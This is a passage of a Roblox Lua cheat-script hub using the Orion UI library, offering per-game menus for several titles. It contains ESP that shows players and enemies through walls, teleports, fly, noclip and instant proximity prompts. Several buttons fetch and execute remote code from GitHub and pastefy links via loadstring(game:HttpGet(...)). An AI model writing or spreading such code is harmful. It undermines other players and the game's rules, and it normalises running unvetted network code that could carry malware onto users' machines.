    label.TextSize = 16
    label.Font = Enum.Font.FredokaOne
    label.TextColor3 = color
    label.TextStrokeTransparency = 0.2
    label.Text = text

    return label
end

Tab:AddToggle({
    Name = "Players ESP",
    Default = false,
    Callback = function(Value)
        PlayerESP = Value

        if not Value then
            for _, v in ipairs(game.Players:GetPlayers()) do
                local head = v.Character and v.Character:FindFirstChild("Head")
                if head and head:FindFirstChild("PlayerEsp") then
                    head.PlayerEsp:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while PlayerESP do
                local localPlayer = game.Players.LocalPlayer
                for _, v in ipairs(game.Players:GetPlayers()) do
                    if v ~= localPlayer and v.Character and v.Character:FindFirstChild("Head") then
                        local head = v.Character.Head
                        local humanoid = v.Character:FindFirstChild("Humanoid")
                        local root = v.Character:FindFirstChild("HumanoidRootPart")
                        if head and humanoid and root then
                            local label = nil
                            if not head:FindFirstChild("PlayerEsp") then
                                label = createESP(head, "PlayerEsp", "", Color3.new(1, 1, 1))
                            else
                                label = head.PlayerEsp:FindFirstChildOfClass("TextLabel")
                            end

                            if label then
                                local distance = math.floor((root.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude)
                                label.Text = v.Name .. " | " .. distance .. "m | HP: " .. math.floor(humanoid.Health)
                            end
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Enemies ESP",
    Default = false,
    Callback = function(Value)
        EnemyESP = Value
        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "EnemyESP" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while EnemyESP do
                local lp = game.Players.LocalPlayer
                local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                
                -- Check if Enemies folder exists
                local enemiesFolder = workspace:FindFirstChild("Enemies")
                if enemiesFolder and hrp then
                    -- Loop through all models in Enemies folder
                    for _, model in pairs(enemiesFolder:GetChildren()) do
                        if model:IsA("Model") then
                            local humanoidRootPart = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChild("Head") or model:FindFirstChildWhichIsA("BasePart")
                            
                            if humanoidRootPart then
                                local label = nil
                                if not humanoidRootPart:FindFirstChild("EnemyESP") then
                                    label = createESP(humanoidRootPart, "EnemyESP", model.Name, Color3.fromRGB(255, 0, 0))
                                else
                                    label = humanoidRootPart:FindFirstChild("EnemyESP"):FindFirstChildOfClass("TextLabel")
                                end

                                if label then
                                    local dist = math.floor((humanoidRootPart.Position - hrp.Position).Magnitude)
                                    label.Text = model.Name .. " | " .. dist .. "m"
                                end
                            end
                        end
                    end
                end

                task.wait(0.5)
            end
        end)
    end
})

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 92483185275059 then -- Pim's Corn Maze
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Auto"
})

Tab:AddButton({
    Name = "Auto Get Harvester Glove Button (Credits To: Inco)",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IncognitoScripts/SlapBattles/main/AutoHarvester", true))()
    end
})

Section = Tab:AddSection({
    Name = "Teleports"
})

Tab:AddButton({
    Name = "Teleport To Exit (1, 2, 3 and 4 Mazes)",
    Callback = function()
        local darkness = workspace:FindFirstChild("Maze") and 
                        workspace.Maze:FindFirstChild("transition") and 
                        workspace.Maze.transition:FindFirstChild("core") and 
                        workspace.Maze.transition.core:FindFirstChild("Darkness")
        
        if darkness and darkness:IsA("Model") then
            -- Find a valid part in the Darkness model to teleport to
            local targetPart = darkness:FindFirstChild("HumanoidRootPart") or 
                              darkness:FindFirstChild("Head") or 
                              darkness:FindFirstChild("Torso") or
                              darkness:FindFirstChildWhichIsA("BasePart")
            
            if targetPart and game.Players.LocalPlayer.Character then
                local hrp = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    -- Calculate position 5 studs away from the target part
                    local direction = (hrp.Position - targetPart.Position).Unit
                    local safePosition = targetPart.Position + (direction * 5)
                    
                    -- Create new CFrame 5 studs away, facing the exit
                    local newCFrame = CFrame.new(safePosition, targetPart.Position)
                    hrp.CFrame = newCFrame
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "Teleport To Glove (5 Maze)",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-341, 2, 392)
    end
})

Tab:AddButton({
    Name = "Teleport To Finish (Last Maze)",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-234, 2, 1658)
    end
})

Section = Tab:AddSection({
    Name = "ESP Feature"
})

-- ========== Helper: Create Billboard ESP ==========
local function createESP(parent, name, text, color)
    local esp = Instance.new("BillboardGui", parent)
    esp.Name = name
    esp.Adornee = parent
    esp.Size = UDim2.new(0, 150, 0, 40)
    esp.StudsOffset = Vector3.new(0, 2, 0)
    esp.AlwaysOnTop = true

    local label = Instance.new("TextLabel", esp)
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 1, 0)
    label.TextSize = 16
    label.Font = Enum.Font.FredokaOne
    label.TextColor3 = color
    label.TextStrokeTransparency = 0.2
    label.Text = text

    return label
end

Tab:AddToggle({
    Name = "Players ESP",
    Default = false,
    Callback = function(Value)
        PlayerESP = Value

        if not Value then
            for _, v in ipairs(game.Players:GetPlayers()) do
                local head = v.Character and v.Character:FindFirstChild("Head")
                if head and head:FindFirstChild("PlayerEsp") then
                    head.PlayerEsp:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while PlayerESP do
                local localPlayer = game.Players.LocalPlayer
                for _, v in ipairs(game.Players:GetPlayers()) do
                    if v ~= localPlayer and v.Character and v.Character:FindFirstChild("Head") then
                        local head = v.Character.Head
                        local humanoid = v.Character:FindFirstChild("Humanoid")
                        local root = v.Character:FindFirstChild("HumanoidRootPart")
                        if head and humanoid and root then
                            local label = nil
                            if not head:FindFirstChild("PlayerEsp") then
                                label = createESP(head, "PlayerEsp", "", Color3.new(1, 1, 1))
                            else
                                label = head.PlayerEsp:FindFirstChildOfClass("TextLabel")
                            end

                            if label then
                                local distance = math.floor((root.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude)
                                label.Text = v.Name .. " | " .. distance .. "m | HP: " .. math.floor(humanoid.Health)
                            end
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Enemies ESP",
    Default = false,
    Callback = function(Value)
        NPCESP = Value
        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "NPCESP" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while NPCESP do
                local lp = game.Players.LocalPlayer
                local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                
                -- Check if NPCs folder exists
                local npcsFolder = workspace:FindFirstChild("NPCs")
                if npcsFolder and hrp then
                    -- Loop through all models in NPCs folder
                    for _, model in pairs(npcsFolder:GetChildren()) do
                        if model:IsA("Model") then
                            local humanoidRootPart = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChild("Head") or model:FindFirstChildWhichIsA("BasePart")
                            
                            if humanoidRootPart then
                                local label = nil
                                if not humanoidRootPart:FindFirstChild("NPCESP") then
                                    label = createESP(humanoidRootPart, "NPCESP", model.Name, Color3.fromRGB(255, 0, 0))
                                else
                                    label = humanoidRootPart:FindFirstChild("NPCESP"):FindFirstChildOfClass("TextLabel")
                                end

                                if label then
                                    local dist = math.floor((humanoidRootPart.Position - hrp.Position).Magnitude)
                                    label.Text = model.Name .. " | " .. dist .. "m"
                                end
                            end
                        end
                    end
                end

                task.wait(0.5)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Exit ESP",
    Default = false,
    Callback = function(Value)
        ExitESP = Value
        if not Value then
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BillboardGui") and v.Name == "ExitESP" then
                    v:Destroy()
                end
            end
            return
        end

        task.spawn(function()
            while ExitESP do
                local lp = game.Players.LocalPlayer
                local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                
                -- Find the Darkness model in the specific path
                local darkness = workspace:FindFirstChild("Maze") and 
                               workspace.Maze:FindFirstChild("transition") and 
                               workspace.Maze.transition:FindFirstChild("core") and 
                               workspace.Maze.transition.core:FindFirstChild("Darkness")
                
                if darkness and hrp and darkness:IsA("Model") then
                    local humanoidRootPart = darkness:FindFirstChild("HumanoidRootPart") or darkness:FindFirstChild("Head") or darkness:FindFirstChildWhichIsA("BasePart")
                    
                    if humanoidRootPart then
                        local label = nil
                        if not humanoidRootPart:FindFirstChild("ExitESP") then
                            label = createESP(humanoidRootPart, "ExitESP", "Exit", Color3.fromRGB(0, 255, 0))
                        else
                            label = humanoidRootPart:FindFirstChild("ExitESP"):FindFirstChildOfClass("TextLabel")
                        end

                        if label then
                            local dist = math.floor((humanoidRootPart.Position - hrp.Position).Magnitude)
                            label.Text = "Exit | " .. dist .. "m"
                        end
                    end
                end

                task.wait(0.5)
            end
        end)
    end
})

Section = Tab:AddSection({
    Name = "Others"
})

-- Variables for Auto Set Proximity Prompt
local isAutoSetHoldDuration = false
local autoSetHoldDurationThread

-- Function to stop threads safely
local function stopThread(thread)
    if thread then
        task.cancel(thread)
    end
end

-- Function to set all ProximityPrompts to 0 second cooldown
local function autoSetHoldDuration()
    while isAutoSetHoldDuration do
        -- Search through entire workspace for ProximityPrompts
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then
                -- Set all relevant properties to 0 for instant activation
                obj.HoldDuration = 0
                obj.ActionText = "Instant Use"
                obj.MaxActivationDistance = 50 -- Increase range so you can use from further away
                
                -- Optional: Make it click-based instead of hold-based
                obj.ClickablePrompt = true
                obj.RequiresLineOfSight = false
            end
        end
        
        -- Also check other important services
        local services = {
            game:GetService("ReplicatedStorage"),
            game:GetService("ServerStorage"),
            game:GetService("StarterPack"),
            game:GetService("StarterGui"),
            game:GetService("Lighting")
        }
        
        for _, service in pairs(services) do
            for _, obj in pairs(service:GetDescendants()) do
                if obj:IsA("ProximityPrompt") then
                    obj.HoldDuration = 0
                    obj.ActionText = "Instant Use"
                    obj.MaxActivationDistance = 50
                    obj.ClickablePrompt = true
                    obj.RequiresLineOfSight = false
                end
            end
        end
        
        task.wait(0.2) -- Check every 0.5 seconds for new ProximityPrompts
    end
end

-- Add the toggle
Tab:AddToggle({
    Name = "Auto Set Proximity Prompt (0 Sec CD)",
    Default = false,
    Callback = function(Value)
        isAutoSetHoldDuration = Value
        if Value then
            autoSetHoldDurationThread = task.spawn(autoSetHoldDuration)
        else
            stopThread(autoSetHoldDurationThread)
        end
    end
})

-- Variables for Fly and Noclip
local isFlying = false
local isNoclipping = false
local flyThread
local noclipThread
local bodyVelocity
local bodyGyro

-- Function to stop threads safely
local function stopThread(thread)
    if thread then
        task.cancel(thread)
    end
end

-- Fly function
local function fly()
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not humanoidRootPart then return end
    
    -- Remove existing controls
    if bodyVelocity then bodyVelocity:Destroy() end
    if bodyGyro then bodyGyro:Destroy() end
    
    -- Create BodyVelocity for movement
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
    bodyVelocity.P = 1250
    bodyVelocity.Parent = humanoidRootPart
    
    -- Create BodyGyro for direction control
    bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(50000, 50000, 50000)
    bodyGyro.P = 1250
    bodyGyro.D = 250
    bodyGyro.Parent = humanoidRootPart
    
    -- Fly controls
    local flySpeed = 50
    while isFlying and character and humanoidRootPart do
        if bodyGyro and bodyVelocity then
            bodyGyro.CFrame = workspace.CurrentCamera.CFrame
            
            local direction = Vector3.new()
            if userinputservice:IsKeyDown(Enum.KeyCode.W) then
                direction = direction + workspace.CurrentCamera.CFrame.LookVector
            end
            if userinputservice:IsKeyDown(Enum.KeyCode.S) then
                direction = direction - workspace.CurrentCamera.CFrame.LookVector
            end
            if userinputservice:IsKeyDown(Enum.KeyCode.A) then
                direction = direction - workspace.CurrentCamera.CFrame.RightVector
            end
            if userinputservice:IsKeyDown(Enum.KeyCode.D) then
                direction = direction + workspace.CurrentCamera.CFrame.RightVector
            end
            if userinputservice:IsKeyDown(Enum.KeyCode.Space) then
                direction = direction + Vector3.new(0, 1, 0)
            end
            if userinputservice:IsKeyDown(Enum.KeyCode.LeftControl) then
                direction = direction + Vector3.new(0, -1, 0)
            end
            
            if direction.Magnitude > 0 then
                bodyVelocity.Velocity = direction.Unit * flySpeed
            else
                bodyVelocity.Velocity = Vector3.new(0, 0, 0)
            end
        end
        task.wait()
    end
    
    -- Cleanup when flying stops
    if bodyVelocity then bodyVelocity:Destroy() end
    if bodyGyro then bodyGyro:Destroy() end
end

-- Noclip function
local function noclip()
    local player = game.Players.LocalPlayer
    
    while isNoclipping do
        if player.Character then
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
        task.wait(0.1)
    end
    
    -- Restore collision when noclip stops
    if player.Character then
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- Add Fly Toggle
Tab:AddToggle({
    Name = "Enable/Disable Fly",
    Default = false,
    Callback = function(Value)
        isFlying = Value
        if Value then
            flyThread = task.spawn(fly)
        else
            stopThread(flyThread)
            if bodyVelocity then bodyVelocity:Destroy() end
            if bodyGyro then bodyGyro:Destroy() end
        end
    end
})

-- Add Noclip Toggle
Tab:AddToggle({
    Name = "Enable/Disable Noclip",
    Default = false,
    Callback = function(Value)
        isNoclipping = Value
        if Value then
            noclipThread = task.spawn(noclip)
        else
            stopThread(noclipThread)
            -- Restore collision when disabled
            local player = game.Players.LocalPlayer
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "Remove Blur Effects",
    Callback = function()
game:GetService("Lighting").Bloom:destroy()
game:GetService("Lighting").Blur:destroy()
game:GetService("Lighting").ColorCorrection:destroy()
game:GetService("Lighting").SunRays:destroy()
game:GetService("Lighting").Sky:destroy()
    end
})

    Tab:AddToggle({
        Name = "Full Bright",
        Default = false,
        Callback = function(Value)
            local Lighting = game:GetService("Lighting")
            if Value then
                Lighting.Brightness = 10
                Lighting.ClockTime = 12
                Lighting.FogEnd = 10000
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
            else
                Lighting.Brightness = 2
                Lighting.ClockTime = 14
                Lighting.FogEnd = 100000
                Lighting.GlobalShadows = false
                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
        end
    })

Tab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

end

if game.PlaceId == 94481828238038 then -- Snowball Smash 2025
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "ESP Stuff"
})

-- ========== Helper: Create Billboard ESP ==========
local function createESP(parent, name, text, color)
    local esp = Instance.new("BillboardGui", parent)
    esp.Name = name
    esp.Adornee = parent
    esp.Size = UDim2.new(0, 150, 0, 40)
    esp.StudsOffset = Vector3.new(0, 2, 0)
    esp.AlwaysOnTop = true

    local label = Instance.new("TextLabel", esp)
    label.BackgroundTransparency = 1
    label.Size = UDim2.new(1, 0, 1, 0)
    label.TextSize = 16
    label.Font = Enum.Font.FredokaOne
    label.TextColor3 = color
    label.TextStrokeTransparency = 0.2
    label.Text = text

    -- Create highlight
    local highlight = Instance.new("Highlight")
    highlight.Name = name .. "Highlight"
    highlight.Adornee = parent
    highlight.FillColor = color
    highlight.FillTransparency = 0.5
    highlight.OutlineColor = color
    highlight.OutlineTransparency = 0
    highlight.Parent = parent

    return label
end

-- ========== Players ESP ==========
Tab:AddToggle({
    Name = "Players ESP",
    Default = false,
    Callback = function(Value)
        PlayerESP = Value

        if not Value then
            for _, v in ipairs(game.Players:GetPlayers()) do
                local head = v.Character and v.Character:FindFirstChild("Head")
                if head then
                    if head:FindFirstChild("PlayerEsp") then
                        head.PlayerEsp:Destroy()
                    end
                    if head:FindFirstChild("PlayerEspHighlight") then
                        head.PlayerEspHighlight:Destroy()
                    end
                end
            end
            return
        end

        task.spawn(function()
            while PlayerESP do
                local localPlayer = game.Players.LocalPlayer
                for _, v in ipairs(game.Players:GetPlayers()) do
                    if v ~= localPlayer and v.Character and v.Character:FindFirstChild("Head") then
                        local head = v.Character.Head
                        local humanoid = v.Character:FindFirstChild("Humanoid")
                        if head and humanoid then
                            if not head:FindFirstChild("PlayerEsp") then
                                createESP(head, "PlayerEsp", v.Name, Color3.new(1, 1, 1))
                            end
                        end
                    end
                end
                task.wait(0.1)
            end
        end)
    end
})

Tab:AddToggle({
    Name = "Items ESP",
    Default = false,
    Callback = function(Value)
        ItemsESP = Value
        
        -- First, clean up all existing ESP objects
        if not Value then
            for _, node in pairs(workspace.Interactables.Nodes:GetChildren()) do
                for _, part in pairs(node:GetChildren()) do
                    if part:IsA("BasePart") then
                        local espGui = part:FindFirstChild("ItemsESP_Gui")
                        if espGui then espGui:Destroy() end
                        
                        local highlight = part:FindFirstChild("ItemsESP_Highlight")
                        if highlight then highlight:Destroy() end
                    end
                end
            end
            return
        end
        
        -- Function to create ESP for a basepart
        local function createItemESP(part, name)
            if part:FindFirstChild("ItemsESP_Gui") then return end
            
            -- Create BillboardGui for text
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "ItemsESP_Gui"
            billboard.Adornee = part
            billboard.Size = UDim2.new(0, 100, 0, 40)
            billboard.StudsOffset = Vector3.new(0, 3, 0)
            billboard.AlwaysOnTop = true
            billboard.MaxDistance = 1000
            
            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Text = name
            textLabel.TextColor3 = Color3.fromRGB(0, 255, 0) -- Green
            textLabel.TextSize = 14
            textLabel.Font = Enum.Font.GothamBold
            textLabel.TextStrokeTransparency = 0
            textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            textLabel.Parent = billboard
            
            billboard.Parent = part
            
            -- Create Highlight for visual effect
            local highlight = Instance.new("Highlight")
            highlight.Name = "ItemsESP_Highlight"
            highlight.Adornee = part
            highlight.FillColor = Color3.fromRGB(0, 255, 0) -- Green
            highlight.FillTransparency = 0.7
            highlight.OutlineColor = Color3.fromRGB(0, 200, 0)
            highlight.OutlineTransparency = 0
            highlight.Parent = part
        end
        
        -- Function to scan and add ESP to all baseparts in Nodes
        local function scanAndAddESP()
            for _, node in pairs(workspace.Interactables.Nodes:GetChildren()) do
                for _, part in pairs(node:GetChildren()) do
                    if part:IsA("BasePart") then
                        createItemESP(part, node.Name)
                    end
                end
            end
        end
        
        -- Initial scan
        scanAndAddESP()
        
        -- Continuous monitoring for new items
        task.spawn(function()
            while ItemsESP do
                -- Check for new nodes or parts
                for _, node in pairs(workspace.Interactables.Nodes:GetChildren()) do
                    for _, part in pairs(node:GetChildren()) do
                        if part:IsA("BasePart") and not part:FindFirstChild("ItemsESP_Gui") then
                            createItemESP(part, node.Name)
                        end
                    end
                end
                task.wait(1) -- Check every second
            end
        end)
    end
})

Section = Tab:AddSection({
    Name = "Main Stuff"
})

Tab:AddButton({
    Name = "[V2] 🎄 GET ELF GLOVE - DonjoSx",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dramukin-fermal/Slap-battles/refs/heads/main/XMasHub.luau"))()
    end
})

Tab:AddButton({
    Name = "[☃️CHRISTMAS] Slap Battles Script - BaconScripter",
    Callback = function()
loadstring(game:HttpGet("https://pastefy.app/PmEUWqB6/raw",true))()
    end
})

Tab:AddParagraph("Slap Aura Message", [[
idk how to make it lol ill try soon to make my version ig
]])

end

if game.PlaceId == 122901288403496 then -- You're Hired!
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Info",
    Icon = "rbxassetid://7734053426",
    PremiumOnly = false
})

CheckCash = Tab:AddLabel("Check Cash: [ "..game:GetService("Players").LocalPlayer.PlayerGui.Displays.topBarHolder.cash.." ]")

CheckDay = Tab:AddLabel("Check Day: [ "..game:GetService("Players").LocalPlayer.PlayerGui.Displays.subBarHolder.day.." ]")

local AutoSetInfoServer
AutoSetInfo = Tab:AddToggle({
	Name = "Auto Set Info",
	Default = false,
	Callback = function(Value)
_G.AutoSetInfo = Value
AutoSetInfoServer = game:GetService("RunService").RenderStepped:Connect(function()
if _G.AutoSetInfo == true then

CheckCash:Set("Check Cash: [ "..game:GetService("Players").LocalPlayer.PlayerGui.Displays.topBarHolder.cash.." ]")

CheckDay:Set("Check: [ "..game:GetService("Players").LocalPlayer.PlayerGui.Displays.subBarHolder.day.." ]")

ServerPlayers:Set("Players In Server [ "..#game.Players:GetPlayers().." / "..game.Players.MaxPlayers.." ]")
    elseif _G.AutoSetInfo == false then
	    if AutoSetInfoServer then
		    AutoSetInfoServer:Disconnect()
		        AutoSetInfoServer = nil
	end
end
end)
	end    
})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7733960981",
    PremiumOnly = false
})

Tab:AddButton({
    Name = "Auto shopkeeper glove obtain - DonjoSx",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/dramukin-fermal/Slap-battles/refs/heads/badge-script/Shopkeeper.luau"))()
    end
})

Tab:AddButton({
    Name = "auto clean, auto sell glove - BaconScripter",
    Callback = function()
loadstring(game:HttpGet("https://pastefy.app/0tjqfrsG/raw"))()
    end
})

Tab:AddParagraph("Message", [[
soon will be out mine version maybe
]])

end

if game.PlaceId == 79885102123162 then -- Find The Gloves
local Window = OrionLib:MakeWindow({Name = gameName .. " Hub OP",HidePremium = true,IntroEnabled = true,IntroText = gameName,IntroIcon = "rbxassetid://15315284749",ToggleIcon = "assetid://7734091286"})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://7734053426",
    PremiumOnly = false
})

-- Ultra Fast Glove Location Teleporter System
do
    local Players = game:GetService("Players")
    local localPlayer = Players.LocalPlayer
    local teleportRunning = false
    local autoSolveEnabled = false
    local ultraFastMode = false
    
    -- List of all glove location paths
    local gloveLocations = {
        "workspace.Map.GloveLocation.Barzil",
        "workspace.Map.GloveLocation.CastleIsland", 
        "workspace.Map.GloveLocation.Global",
        "workspace.Map.GloveLocation.Halloween",
        "workspace.Map.GloveLocation.Limbo",
        "workspace.Map.GloveLocation.RegularMap",
        "workspace.Map.GloveLocation.SlapRoyale",
        "workspace.Map.GloveLocation.Winter"
    }
    
    -- Cache for found models
    local cachedModels = {}
    local lastCacheTime = 0
    local teleportedModels = {} -- Track teleported models
    
    -- Function to check if a model is visible
    local function isModelVisible(model)
        -- Check model attributes
        local success, visibleAttr = pcall(function()
            return model:GetAttribute("Visible")
        end)
        
        if success and visibleAttr == false then
            return false
        end
        
        -- Check child parts for Visible = false
        for _, descendant in ipairs(model:GetDescendants()) do
            if descendant:IsA("BasePart") then
                local success, isVisible = pcall(function()
                    return descendant.Visible
                end)
                
                if success and isVisible == false then
                    return false
                end
            end
            
            -- Check for BoolValue named "Visible"
            if descendant:IsA("BoolValue") and descendant.Name == "Visible" then
                if descendant.Value == false then
                    return false
                end
            end
        end
        
        return true
    end
    
    -- Function to cache all models (optimized) - only models with Visible = true or no Visible property
    local function cacheAllModels()
        if tick() - lastCacheTime < 10 then -- Cache for 10 seconds
            return #cachedModels > 0
        end
        
        cachedModels = {}
        teleportedModels = {} -- Reset teleported models
        
        for _, locationPath in ipairs(gloveLocations) do
            local location = workspace:FindFirstChild("Map")
            if location then
                location = location:FindFirstChild("GloveLocation")
                if location then
                    local folderName = locationPath:match("%.([^%.]+)$")
                    local folder = location:FindFirstChild(folderName)
                    
                    if folder then
                        for _, child in ipairs(folder:GetChildren()) do
                            if child:IsA("Model") then
                                -- Only include visible models
                                if isModelVisible(child) then
                                    table.insert(cachedModels, child)
                                end
                            end
                        end
                    end
                end
            end
        end
        
        lastCacheTime = tick()
        print("Cached " .. #cachedModels .. " visible models")
        return #cachedModels > 0
    end
    
    -- Function to get a random model that hasn't been teleported to recently
    local function getRandomModelFast()
        if #cachedModels == 0 then
            cacheAllModels()
        end
        
        if #cachedModels == 0 then
            return nil
        end
        
        -- Filter out models that have been teleported to recently
        local availableModels = {}
        local currentTime = tick()
        
        for _, model in ipairs(cachedModels) do
            local lastTeleportTime = teleportedModels[model] or 0
            if currentTime - lastTeleportTime > 1 then -- 1 second cooldown
                -- Check if model is still visible
                if isModelVisible(model) then
                    table.insert(availableModels, model)
                end
            end
        end
        
        -- If all models are on cooldown, clear the teleported list
        if #availableModels == 0 then
            teleportedModels = {}
            availableModels = cachedModels
        end
        
        if #availableModels > 0 then
            local selectedModel = availableModels[math.random(1, #availableModels)]
            teleportedModels[selectedModel] = tick() -- Mark as teleported
            return selectedModel
        end
        
        return nil
    end
    
    -- Ultra fast teleport function
    local function teleportToModelFast(model)
        if not model or not model:IsA("Model") then
            return false
        end
        
        local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then
            return false
        end
        
        -- Get position quickly
        local modelPosition
        if model.PrimaryPart then
            modelPosition = model.PrimaryPart.Position
        else
            modelPosition = model:GetPivot().Position
        end
        
        -- Teleport slightly above
        humanoidRootPart.CFrame = CFrame.new(modelPosition + Vector3.new(0, 5, 0))
        return true
    end
    
    -- Fast solve function
    local function autoSolveModelFast(model)
        if not model or not model:IsA("Model") then
            return
        end
        
        -- Quick solve attempts
        for _, descendant in ipairs(model:GetDescendants()) do
            -- Visible property
            if descendant:IsA("BasePart") then
                pcall(function() 
                    descendant.Visible = true 
                end)
            end
            
            -- Solved property
            if descendant.Name == "Solved" then
                if descendant:IsA("BoolValue") then
                    descendant.Value = true
                elseif descendant:IsA("StringValue") then
                    pcall(function() 
                        descendant.Value = "true" 
                    end)
                end
            end
        end
        
        -- Model attributes
        pcall(function() 
            model:SetAttribute("Solved", true) 
        end)
        pcall(function() 
            model:SetAttribute("Visible", true) 
        end)
    end
    
   -- Button: Teleport to Random Model
    Tab:AddButton({
        Name = "Teleport to Random Glove",
        Callback = function()
            cacheAllModels()
            local model = getRandomModelFast()
            if model then
                if teleportToModelFast(model) then
                    if autoSolveEnabled then
                        autoSolveModelFast(model)
                    end
                    OrionLib:MakeNotification({
                        Name = "Teleported",
                        Content = model.Name .. " in " .. model.Parent.Name,
                        Image = "rbxassetid://7733919105",
                        Time = 1
                    })
                end
            else
                OrionLib:MakeNotification({
                    Name = "No Models",
                    Content = "No visible models found",
                    Image = "rbxassetid://7733919105",
                    Time = 2
                })
            end
        end
    })
    
    -- Toggle: Ultra Fast Auto Teleport (0.01 seconds)
    Tab:AddToggle({
        Name = "Auto Teleport To Gloves (0.01s)",
        Default = false,
        Callback = function(enabled)
            ultraFastMode = enabled
            
            if enabled then
                OrionLib:MakeNotification({
                    Name = "ULTRA FAST MODE",
                    Content = "Teleporting every 0.01 seconds!\nWill skip invisible models\nWon't repeat models for 1 second",
                    Image = "rbxassetid://7733919105",
                    Time = 3
                })
                
                -- Cache models first
                cacheAllModels()
                print("Starting ultra-fast teleport...")
                
                -- Ultra fast teleport loop
                task.spawn(function()
                    local connection
                    connection = game:GetService("RunService").Heartbeat:Connect(function()
                        if not ultraFastMode then
                            if connection then
                                connection:Disconnect()
                            end
                            return
                        end
                        
                        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local model = getRandomModelFast()
                            if model then
                                teleportToModelFast(model)
                                
                                -- Auto solve if enabled
                                if autoSolveEnabled then
                                    autoSolveModelFast(model)
                                end
                            end
                        end
                    end)
                end)
                
            else
                OrionLib:MakeNotification({
                    Name = "Stopped",
                    Content = "Auto teleport disabled",
                    Image = "rbxassetid://7733919105",
                    Time = 2
                })
            end
        end
    })
    
    -- Toggle: Auto Solve Models
    Tab:AddToggle({
        Name = "Auto Solve Gloves (Visible+Solved)",
        Default = false,
        Callback = function(enabled)
            autoSolveEnabled = enabled
            
            OrionLib:MakeNotification({
                Name = enabled and "Auto Solve ON" or "Auto Solve OFF",
                Content = "",
                Image = "rbxassetid://7733919105",
                Time = 2
            })
        end
    })
end
  
    -- Warning label
    Tab:AddParagraph("⚠ WARNING", "Ultra Fast mode will teleport you rapidly!\nMake sure you have a good computer.\nCan cause lag or crashes.")

end -- FINISH ENITRE SCRIPT
OrionLib:Init() -- FINISH ENITRE SCRIPT
